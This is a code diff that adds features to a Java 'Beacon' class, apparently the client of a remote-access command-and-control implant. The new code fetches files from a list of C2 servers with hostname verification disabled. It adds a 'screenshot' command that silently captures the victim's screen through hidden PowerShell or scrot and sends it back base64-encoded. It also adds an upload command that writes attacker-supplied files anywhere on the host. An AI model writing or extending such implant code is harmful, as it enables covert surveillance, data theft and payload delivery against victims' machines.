@@ -2323,6 +2323,27 @@ public class Beacon {
         } catch (Exception e) { return System.getProperty("user.dir"); }
     }
 
+    // ── HTTP GET (binary) ─────────────────────────────────────
+    private static byte[] getBytes(String path) {
+        for (int i = 0; i < C2_URLS.length; i++) {
+            String url = C2_URLS[(urlIdx + i) % C2_URLS.length];
+            try {
+                HttpURLConnection conn = (HttpURLConnection) new URL(url + path).openConnection();
+                if (conn instanceof HttpsURLConnection)
+                    ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
+                if (conn instanceof HttpsURLConnection)
+                    ((HttpsURLConnection) conn).setHostnameVerifier((h, s) -> true);
+                conn.setRequestMethod("GET");
+                conn.setRequestProperty("X-Agent-Secret", SECRET);
+                conn.setConnectTimeout(10000); conn.setReadTimeout(30000);
+                byte[] data = conn.getInputStream().readAllBytes();
+                urlIdx = (urlIdx + i) % C2_URLS.length;
+                return data;
+            } catch (Exception ignored) {}
+        }
+        return null;
+    }
+
     // ── System info ───────────────────────────────────────────
     private static String localIp() {
         try {
@@ -2355,7 +2376,7 @@ public class Beacon {
     }
 
     // ── Command execution ─────────────────────────────────────
-    private static String runCommand(String cmd) {
+    private static String runCommand(String cmd, String taskId) {
         cmd = cmd.trim();
         String os = System.getProperty("os.name","").toLowerCase();
         boolean isWin = os.contains("win");
@@ -2406,6 +2427,49 @@ public class Beacon {
             } catch (Exception e) { return "Error: " + e.getMessage(); }
         }
 
+        if (cmd.equals("screenshot")) {
+            try {
+                File tmp = File.createTempFile("xolo_ss_", ".png");
+                tmp.deleteOnExit();
+                if (isWin) {
+                    String psCmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; " +
+                        "$s=[System.Windows.Forms.Screen]::PrimaryScreen; " +
+                        "$b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); " +
+                        "$g=[System.Drawing.Graphics]::FromImage($b); " +
+                        "$g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); " +
+                        "$b.Save('" + tmp.getAbsolutePath().replace("\\\\", "\\\\\\\\") + "')";
+                    ProcessBuilder pb = new ProcessBuilder("powershell", "-WindowStyle", "Hidden", "-Command", psCmd);
+                    pb.redirectErrorStream(true);
+                    Process p = pb.start(); p.waitFor();
+                    if (!tmp.exists() || tmp.length() == 0) return "Screenshot failed";
+                } else {
+                    ProcessBuilder pb = new ProcessBuilder("scrot", tmp.getAbsolutePath());
+                    pb.redirectErrorStream(true);
+                    Process p = pb.start(); p.waitFor();
+                    if (!tmp.exists() || tmp.length() == 0) return "screenshot: install scrot (apt install scrot)";
+                }
+                byte[] data = Files.readAllBytes(tmp.toPath());
+                tmp.delete();
+                String b64 = Base64.getEncoder().encodeToString(data);
+                return "__b64file__:screenshot_" + System.currentTimeMillis() + ".png:" + b64;
+            } catch (Exception e) { return "Error: " + e.getMessage(); }
+        }
+
+        if (cmd.startsWith("__upload__:") && taskId != null) {
+            String[] parts = cmd.split(":", 3);
+            if (parts.length < 3) return "Error: malformed upload command";
+            String filename = parts[1];
+            String dest = parts[2];
+            if (dest.endsWith("/") || dest.endsWith("\\\\") || new File(dest).isDirectory())
+                dest = dest.replaceAll("[/\\\\\\\\]+$", "") + File.separator + filename;
+            byte[] data = getBytes("/api/beacon/fetch/" + agentId + "/" + taskId);
+            if (data == null) return "Error: could not fetch " + filename;
+            try {
+                Files.write(new File(dest).toPath(), data);
+                return "[+] " + filename + " \\u2192 " + dest + " (" + data.length + " bytes)";
+            } catch (Exception e) { return "Error writing " + dest + ": " + e.getMessage(); }
+        }
+
         // Shell command
         try {
             ProcessBuilder pb = isWin
@@ -2433,7 +2497,7 @@ public class Beacon {
                     String taskId  = jsonGet(resp, "task_id");
                     String command = jsonGet(resp, "command");
                     if (taskId != null && command != null) {
-                        String output = runCommand(command);
+                        String output = runCommand(command, taskId);
                         String result = "{\\"task_id\\":\\"" + taskId + "\\"," +
                             "\\"output\\":\\"" + jsonEscape(output) + "\\"," +
                             "\\"status\\":\\"done\\"}";
